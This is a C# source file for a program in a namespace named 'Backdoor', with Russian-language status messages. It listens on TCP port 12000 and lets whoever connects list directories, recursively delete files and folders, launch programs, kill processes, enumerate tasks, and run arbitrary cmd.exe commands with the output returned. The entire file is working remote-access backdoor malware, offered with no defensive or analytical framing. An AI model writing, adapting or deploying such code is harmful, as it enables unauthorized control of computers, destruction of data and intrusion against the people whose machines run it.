using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Diagnostics;

namespace Backdoor
{
    class Program
    {
        static void Main(string[] args)
        {
            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            Socket conn = null;
            IPHostEntry ipHost = Dns.GetHostEntry("localhost");
            IPAddress ipAddr = ipHost.AddressList[1];
            for (int i = 0; i < ipHost.AddressList.Length; i++)
            {
                Console.WriteLine(ipHost.AddressList[i]);
            }
            IPEndPoint ipEndPoint = new IPEndPoint(ipAddr, 12000);
            sock.Bind(ipEndPoint);
            sock.Listen(1);
            conn = sock.Accept();
            Console.WriteLine(conn);
            conn.Send(Encoding.UTF8.GetBytes("kek"));
            while (true)
            {
                string data = null;

                byte[] bytes = new byte[1024];
                int bytesRec = conn.Receive(bytes);

                data = Encoding.UTF8.GetString(bytes, 0, bytesRec);


                Console.Write("Полученный текст: " + data + "\n\n"); ;

                if(data.StartsWith("ls"))
                {
                    string files = "";
                    data = data.Remove(0, 2);
                    string path = ParseComand(data);
                    var DirFiles = Directory.GetFiles(path);
                    var DirDirectorys = Directory.GetDirectories(path);
                    files += "Найдено файлов: " + DirFiles.Length + ", Найдено папок: " + DirDirectorys.Length + " ";
                    for (int i = 0; i < DirFiles.Length; i++)
                    {
                        files += ", " + DirFiles[i];
                    }
                    for (int i = 0; i < DirDirectorys.Length; i++)
                    {
                        files += ", " + DirDirectorys[i];
                    }
                    conn.Send(Encoding.UTF8.GetBytes(files));
                    data = "";//чтобы система не упала
                    continue;
                }

                if (data.StartsWith("rm"))
                {

                    data = data.Remove(0, 2);
                    string path = ParseComand(data);
                    try { File.Delete(path); } catch { }
                    try { Directory.Delete(path, true); } catch { }

                    conn.Send(Encoding.UTF8.GetBytes("Файл " + path + " удалён."));
                    data = "";//чтобы система не упала
                    continue;
                }

                if (data.StartsWith("start"))
                {

                    data = data.Remove(0, 5);
                    string path = ParseComand(data);

                    Process myProcess = new Process();
                    myProcess.StartInfo.FileName = path;
                    myProcess.Start();

                    conn.Send(Encoding.UTF8.GetBytes("Процесс " + path + " запущён."));
                    data = "";//чтобы система не упала
                    continue;
                }


                if (data.StartsWith("pkill"))
                {
                    data = data.Remove(0, 5);
                    string pname = ParseComand(data);
                    var process = Process.GetProcesses();
                    for (int i = 0; i < process.Length; i++)
                    {
                        if(process[i].ProcessName == pname)
                        {
                            process[i].Kill();
                            break;
                        }
                    }
                    conn.Send(Encoding.UTF8.GetBytes("Процесс с именем " + pname + " уничтожен"));
                    data = "";//чтобы система не упала
                    continue;
                }

                if (data =="tasklist")
                {
                    string tasks = "";

                    var process = Process.GetProcesses();
                    for (int i = 0; i < process.Length; i++)
                    {
                        tasks += process[i].ProcessName + " - " + process[i].Id + "\r\n";
                    }
                    conn.Send(Encoding.UTF8.GetBytes("Все процессы в системе: " + tasks + " "));
                    data = "";//чтобы система не упала
                    continue;
                }

                if (data.StartsWith("cmd"))
                {
                    data = data.Remove(0, 3);
                    string comm = ParseComand(data);
                    Console.WriteLine(comm);

                    var proc = new Process();
                    proc.StartInfo.RedirectStandardOutput = true;
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.FileName = "CMD.exe";
                    proc.StartInfo.Arguments =  " /C " + comm;
                    proc.Start();
                    string result = proc.StandardOutput.ReadToEnd();
                    conn.Send(Encoding.UTF8.GetBytes(result));
                    data = "";//чтобы система не упала
                    
                    continue;
                }

                if (data.StartsWith("msg"))
                {
                    data = data.Remove(0, 3);
                    string comm = ParseComand(data);

                    var proc = new Process();
                    proc.StartInfo.FileName = "CMD.exe";
                    proc.StartInfo.Arguments = " /K " + "echo " + comm;
                    proc.Start();
                    conn.Send(Encoding.UTF8.GetBytes($"Сообщение {comm} отправлено"));
                    data = "";

                    continue;
                }
                conn.Send(Encoding.UTF8.GetBytes("Получено"));
            }
        }
        public static string ParseComand(string allcommand)
        {
            string commandBody = "";


            bool flag = false;
            for (int i = 0; i < allcommand.Length; i++)
            {
                if (flag)
                    commandBody += allcommand[i];
                if (allcommand[i] == '$')
                    flag = true;
            }
            return commandBody;
        }
    }
}
